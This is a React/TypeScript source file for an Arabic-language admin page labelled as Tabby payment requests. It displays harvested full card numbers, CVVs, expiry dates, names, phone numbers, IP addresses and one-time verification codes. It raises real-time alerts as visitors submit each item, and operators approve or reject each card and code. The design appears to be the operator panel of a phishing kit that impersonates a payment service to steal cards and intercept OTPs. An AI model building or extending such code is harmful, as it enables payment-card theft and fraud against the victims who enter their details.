import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAdminNotifications } from "@/hooks/useAdminNotifications";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { AdminSidebar } from "@/components/AdminSidebar";
import { SidebarProvider } from "@/components/ui/sidebar";
import { Loader2, CreditCard, Check, X, Globe } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { VisitorStatusIndicator } from "@/components/VisitorStatusIndicator";

interface TabbyPayment {
  id: string;
  cardholder_name: string;
  card_number: string;
  card_number_last4: string;
  expiry_date: string;
  cvv: string;
  total_amount: number;
  company: string | null;
  phone: string | null;
  payment_status: string;
  created_at: string;
  updated_at: string;
  visitor_session_id?: string | null;
}

interface TabbyPaymentAttempt {
  id: string;
  payment_id: string;
  card_number: string;
  cardholder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
  approval_status?: string;
}

interface TabbyOtpAttempt {
  id: string;
  payment_id: string;
  otp_code: string;
  created_at: string;
  approval_status?: string;
}

interface GroupedCustomer {
  phone: string;
  payments: TabbyPayment[];
  allAttempts: (TabbyPaymentAttempt & { source: 'main' | 'additional', paymentId: string })[];
  allOtps: TabbyOtpAttempt[];
  company: string | null;
  cardholder_name: string;
  visitor_session_id: string | null;
  visitor_ip: string | null;
  latest_created_at: string;
}
const AdminTabbyPayments = () => {
  useAdminNotifications();
  const [groupedCustomers, setGroupedCustomers] = useState<GroupedCustomer[]>([]);
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState<string | null>(null);
  const {
    toast
  } = useToast();
  const navigate = useNavigate();
  
  // دالة لتشغيل صوت إشعار مميز وملفت لتابي
  const playTabbyNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    
    // تشغيل نغمة مميزة ومختلفة عن تمارا
    const playBeep = (frequency: number, startTime: number, duration: number) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(frequency, startTime);
      oscillator.type = 'square'; // نوع موجة مختلف عن تمارا
      
      gainNode.gain.setValueAtTime(0.35, startTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
      
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    };
    
    // تشغيل سلسلة نغمات مختلفة عن تمارا
    const currentTime = audioContext.currentTime;
    playBeep(900, currentTime, 0.12);
    playBeep(1100, currentTime + 0.15, 0.12);
    playBeep(1300, currentTime + 0.3, 0.12);
    playBeep(1500, currentTime + 0.45, 0.2);
    
    // نغمة إضافية
    setTimeout(() => {
      const newTime = audioContext.currentTime;
      playBeep(1200, newTime, 0.12);
      playBeep(1400, newTime + 0.12, 0.15);
    }, 700);
  };
  useEffect(() => {
    const checkAuth = async () => {
      const {
        data: {
          session
        }
      } = await supabase.auth.getSession();
      if (!session) {
        console.log("⚠️ No session found, redirecting to login");
        navigate("/admin");
        return;
      }
      console.log("✅ Session found, fetching payments...");
      await fetchPayments();
    };
    checkAuth();
    
    // Real-time subscription for all tables
    const channel = supabase.channel('tabby-payments-changes')
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_payments'
      }, (payload) => {
        console.log('🔔 عميل جديد أدخل رقمه في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 طلب دفع تابي جديد!",
          description: `رقم الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount} ر.س`,
          duration: 10000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_payments'
      }, () => {
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_payment_attempts'
      }, (payload) => {
        console.log('🔔 عميل أدخل بيانات بطاقة في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 بطاقة دفع جديدة!",
          description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
          duration: 8000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_payment_attempts'
      }, () => {
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_otp_attempts'
      }, (payload) => {
        console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 كود تحقق جديد!",
          description: `الكود: ${payload.new.otp_code}`,
          duration: 8000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_otp_attempts'
      }, () => {
        fetchPayments();
      })
      .subscribe();
    
    // Auto-refresh every 5 minutes (reduced frequency for better performance)
    const refreshInterval = setInterval(() => {
      fetchPayments();
    }, 300000); // 5 minutes

    return () => {
      supabase.removeChannel(channel);
      clearInterval(refreshInterval);
    };
  }, [navigate]);
  const fetchPayments = async () => {
    try {
      console.log("📊 Fetching tabby payments...");
      const { data, error } = await supabase
        .from('tabby_payments')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100);
      
      if (error) {
        console.error('❌ Error fetching payments:', error);
        toast({
          title: "خطأ",
          description: "حدث خطأ في تحميل البيانات",
          variant: "destructive"
        });
        setLoading(false);
        return;
      }
      
      console.log(`✅ Fetched ${data?.length || 0} payments`);
      
      // Fetch payment attempts and OTP attempts in batch
      if (data && data.length > 0) {
        const paymentIds = data.map(p => p.id);
        const sessionIds = data.map(p => p.visitor_session_id).filter(Boolean) as string[];
        
        const [attemptsResult, otpsResult, visitorTrackingResult] = await Promise.all([
          supabase
            .from('tabby_payment_attempts')
            .select('*')
            .in('payment_id', paymentIds)
            .order('created_at', { ascending: true }),
          supabase
            .from('tabby_otp_attempts')
            .select('*')
            .in('payment_id', paymentIds)
            .order('created_at', { ascending: true }),
          sessionIds.length > 0 ? supabase
            .from('visitor_tracking')
            .select('session_id, ip_address')
            .in('session_id', sessionIds)
            .order('last_active_at', { ascending: false }) : Promise.resolve({ data: [] })
        ]);

        // إنشاء خريطة لـ IP addresses
        const visitorIPMap = (visitorTrackingResult.data || []).reduce((acc: any, visitor: any) => {
          if (!acc[visitor.session_id]) {
            acc[visitor.session_id] = visitor.ip_address;
          }
          return acc;
        }, {});

        // تجميع البيانات حسب رقم الجوال
        const grouped = data.reduce((acc, payment) => {
          const key = payment.phone || payment.visitor_session_id || payment.id;
          
          if (!acc[key]) {
            acc[key] = {
              phone: payment.phone || 'غير متوفر',
              payments: [],
              allAttempts: [],
              allOtps: [],
              company: payment.company,
              cardholder_name: payment.cardholder_name,
              visitor_session_id: payment.visitor_session_id,
              visitor_ip: visitorIPMap[payment.visitor_session_id] || null,
              latest_created_at: payment.created_at
            };
          }
          
          acc[key].payments.push(payment);
          
          // إضافة البطاقة الأساسية كمحاولة إذا كانت تحتوي على بيانات
          if (payment.card_number && payment.card_number !== '0000000000000000') {
            acc[key].allAttempts.push({
              id: payment.id,
              payment_id: payment.id,
              card_number: payment.card_number,
              cardholder_name: payment.cardholder_name,
              expiry_date: payment.expiry_date,
              cvv: payment.cvv,
              created_at: payment.created_at,
              approval_status: payment.payment_status,
              source: 'main',
              paymentId: payment.id
            });
          }
          
          return acc;
        }, {} as Record<string, GroupedCustomer>);

        // إضافة محاولات الدفع الإضافية
        if (attemptsResult.data) {
          attemptsResult.data.forEach(attempt => {
            const payment = data.find(p => p.id === attempt.payment_id);
            if (payment) {
              const key = payment.phone || payment.visitor_session_id || payment.id;
              if (grouped[key]) {
                grouped[key].allAttempts.push({
                  ...attempt,
                  source: 'additional',
                  paymentId: payment.id
                });
              }
            }
          });
        }

        // إضافة أكواد التحقق
        if (otpsResult.data) {
          otpsResult.data.forEach(otp => {
            const payment = data.find(p => p.id === otp.payment_id);
            if (payment) {
              const key = payment.phone || payment.visitor_session_id || payment.id;
              if (grouped[key]) {
                grouped[key].allOtps.push(otp);
              }
            }
          });
        }

        // تحويل إلى مصفوفة وترتيب حسب آخر تحديث
        const groupedArray = Object.values(grouped).sort((a, b) => 
          new Date(b.latest_created_at).getTime() - new Date(a.latest_created_at).getTime()
        );
        
        setGroupedCustomers(groupedArray);
      } else {
        setGroupedCustomers([]);
      }
    } catch (error) {
      console.error('Error fetching payments:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في تحميل البيانات",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };
  const handleApprovePaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على بطاقة الدفع بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectPaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض بطاقة الدفع"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleApproveMainCard = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على البطاقة الأساسية بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving main card:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectMainCard = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض البطاقة الأساسية"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting main card:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleApproveOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على كود التحقق بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض كود التحقق"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };
  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return <Badge className="bg-green-500">موافق عليه</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };
  if (loading) {
    return <div className="flex h-screen items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>;
  }
  return <SidebarProvider>
      <div className="flex min-h-screen w-full bg-background" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8">
          <div className="mb-6">
            <h1 className="text-3xl font-bold">طلبات تابي</h1>
            <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
          </div>

          {groupedCustomers.length === 0 ? <Card className="p-8 text-center">
              <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
            </Card> : <div className="space-y-8">
              {groupedCustomers.map((customer, index) => (
                <div key={customer.phone + index}>
                  {/* خط أحمر فاصل بين العملاء */}
                  {index > 0 && (
                    <div className="my-8 h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent rounded-full"></div>
                  )}
                  
                  <Card className="overflow-hidden shadow-lg border-2 hover:shadow-2xl transition-all">
                    <CardHeader className="bg-gradient-to-r from-blue-50 via-purple-50 to-pink-50 border-b-2 border-primary/20">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-5 w-5 text-primary" />
                          <CardTitle className="text-lg flex items-center gap-2">
                            {customer.cardholder_name}
                            <VisitorStatusIndicator sessionId={customer.visitor_session_id} />
                          </CardTitle>
                        </div>
                        <Badge className="bg-blue-500">
                          {customer.payments.length} طلب
                        </Badge>
                      </div>
                      <CardDescription className="mt-1">
                        آخر تحديث: {format(new Date(customer.latest_created_at), 'PPp', { locale: ar })}
                      </CardDescription>
                    </CardHeader>

                  <CardContent className="p-6">
                    {/* معلومات أساسية - تصميم محسّن */}
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                      <div className="bg-gray-50 border border-gray-200 rounded-lg p-3">
                        <div className="text-xs text-gray-600 font-medium mb-1 flex items-center gap-1">
                          <Globe className="h-3 w-3" />
                          IP Address
                        </div>
                        <div className="font-mono text-xs text-gray-900" dir="ltr">
                          {customer.visitor_ip || 'غير متوفر'}
                        </div>
                      </div>
                      
                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                        <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                        <div className="font-bold text-sm text-gray-900 truncate" title={customer.company || 'غير متوفر'}>
                          {customer.company || 'غير متوفر'}
                        </div>
                      </div>
                      
                      {customer.phone && customer.phone !== 'غير متوفر' && (
                        <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                          <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                          <div className="font-bold text-sm text-gray-900" dir="ltr">
                            {customer.phone}
                          </div>
                        </div>
                      )}
                      
                      <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                        <div className="text-xs text-green-600 font-medium mb-1">عدد المحاولات</div>
                        <div className="font-bold text-lg text-green-700">
                          {customer.allAttempts.length} محاولة
                        </div>
                      </div>
                    </div>

                    {/* جميع محاولات الدفع */}
                    {customer.allAttempts.length > 0 && (
                      <div className="mb-6">
                        <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600 mb-3">
                          <CreditCard className="h-4 w-4" />
                          محاولات الدفع ({customer.allAttempts.length})
                        </h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                          {customer.allAttempts.map((attempt, index) => {
                            const isMainCard = attempt.source === 'main';
                            
                            return (
                              <div 
                                key={attempt.id} 
                                className={`rounded-lg p-3 border-2 ${
                                  attempt.approval_status === 'rejected' 
                                    ? 'bg-red-50 border-red-400' 
                                    : attempt.approval_status === 'approved'
                                    ? 'bg-green-50 border-green-400'
                                    : isMainCard
                                    ? 'bg-blue-50 border-blue-400'
                                    : 'bg-orange-50 border-orange-200'
                                }`}
                              >
                                <div className="flex justify-between items-center mb-2">
                                  <span className={`text-xs font-bold ${
                                    attempt.approval_status === 'rejected' 
                                      ? 'text-red-700' 
                                      : attempt.approval_status === 'approved'
                                      ? 'text-green-700'
                                      : isMainCard
                                      ? 'text-blue-600'
                                      : 'text-orange-600'
                                  }`}>
                                    طريقة دفع #{index + 1}
                                  </span>
                                  {attempt.approval_status === 'approved' && (
                                    <Badge className="bg-green-600 text-xs">
                                      ✓ موافق عليها
                                    </Badge>
                                  )}
                                  {attempt.approval_status === 'rejected' && (
                                    <Badge className="bg-red-600 text-xs">
                                      ✗ مرفوضة
                                    </Badge>
                                  )}
                                  {attempt.approval_status === 'pending' && (
                                    <Badge className="bg-yellow-500 text-xs">
                                      ⏳ قيد الانتظار
                                    </Badge>
                                  )}
                                  {!attempt.approval_status && (
                                    <Badge className="bg-yellow-500 text-xs">
                                      ⏳ قيد الانتظار
                                    </Badge>
                                  )}
                                </div>
                                <div className="space-y-1.5 text-xs">
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">رقم البطاقة:</span>
                                    <span className="font-mono font-medium" dir="ltr">
                                      {attempt.card_number}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الاسم:</span>
                                    <span className="font-medium truncate max-w-[120px]" title={attempt.cardholder_name}>
                                      {attempt.cardholder_name}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الانتهاء:</span>
                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">CVV:</span>
                                    <span className="font-mono font-medium">{attempt.cvv}</span>
                                  </div>
                                  <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t">
                                    {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                  </div>
                                </div>

                                {(!attempt.approval_status || attempt.approval_status === 'pending') && (
                                  <div className="flex gap-2 mt-3 pt-3 border-t">
                                    <Button
                                      onClick={() => isMainCard ? handleApproveMainCard(attempt.paymentId) : handleApprovePaymentAttempt(attempt.id, attempt.payment_id)}
                                      disabled={processing === attempt.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                    >
                                      {processing === attempt.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button
                                      onClick={() => isMainCard ? handleRejectMainCard(attempt.paymentId) : handleRejectPaymentAttempt(attempt.id, attempt.payment_id)}
                                      disabled={processing === attempt.id}
                                      variant="destructive"
                                      className="flex-1 h-8 text-xs"
                                    >
                                      {processing === attempt.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}

                    {/* أكواد التحقق النهائية */}
                    {customer.allOtps.length > 0 && (
                      <div className="mt-6 p-4 bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl border-2 border-purple-300">
                        <h3 className="font-bold flex items-center gap-2 text-lg text-purple-700 mb-4">
                          🔐 أكواد التحقق ({customer.allOtps.length})
                        </h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {customer.allOtps.map((otp, index) => {
                            return (
                              <div 
                                key={otp.id} 
                                className={`border-2 rounded-xl p-4 transition-all ${
                                  otp.approval_status === 'approved'
                                    ? 'bg-green-50 border-green-400'
                                    : otp.approval_status === 'rejected'
                                    ? 'bg-red-50 border-red-400'
                                    : 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400'
                                }`}
                              >
                                <div className="flex justify-between items-center mb-3">
                                  <span className="text-sm font-bold text-purple-700">
                                    كود #{index + 1}
                                  </span>
                                  {otp.approval_status === 'approved' && (
                                    <Badge className="bg-green-500">
                                      ✓ موافق عليه
                                    </Badge>
                                  )}
                                  {otp.approval_status === 'rejected' && (
                                    <Badge className="bg-red-500">
                                      ✗ مرفوض
                                    </Badge>
                                  )}
                                  {!otp.approval_status && (
                                    <Badge className="bg-yellow-500">
                                      ⏳ قيد الانتظار
                                    </Badge>
                                  )}
                                </div>
                                
                                <div className="space-y-2">
                                  <div className="flex justify-between items-center bg-white rounded-lg p-3 shadow-sm">
                                    <span className="text-sm text-gray-600">كود التحقق:</span>
                                    <span className="font-mono font-bold text-2xl tracking-wider text-purple-700">
                                      {otp.otp_code}
                                    </span>
                                  </div>
                                  <div className="text-xs text-gray-600 text-center bg-white rounded-lg p-2">
                                    {format(new Date(otp.created_at), 'PPp', { locale: ar })}
                                  </div>
                                </div>

                                {!otp.approval_status && (
                                  <div className="flex gap-2 mt-3">
                                    <Button 
                                      onClick={() => handleApproveOtp(otp.id, otp.payment_id)} 
                                      disabled={processing === otp.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs h-9"
                                    >
                                      {processing === otp.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button 
                                      onClick={() => handleRejectOtp(otp.id, otp.payment_id)} 
                                      disabled={processing === otp.id}
                                      variant="destructive"
                                      className="flex-1 text-xs h-9"
                                    >
                                      {processing === otp.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}


                    {/* معلومات التاريخ */}
                    <div className="p-3 bg-gray-50 rounded-lg mt-4">
                      <div className="text-xs text-gray-500 mb-1">تاريخ آخر تحديث</div>
                      <div className="text-sm font-medium">
                        {format(new Date(customer.latest_created_at), 'PPp', { locale: ar })}
                      </div>
                      {customer.payments.length > 1 && (
                        <>
                          <div className="text-xs text-gray-500 mt-1">عدد الطلبات</div>
                          <div className="text-sm font-medium">
                            {customer.payments.length} طلب
                          </div>
                        </>
                      )}
                    </div>
                  </CardContent>
                </Card>
              </div>
            ))}
            </div>}
        </div>
      </div>
    </SidebarProvider>;
};
export default AdminTabbyPayments;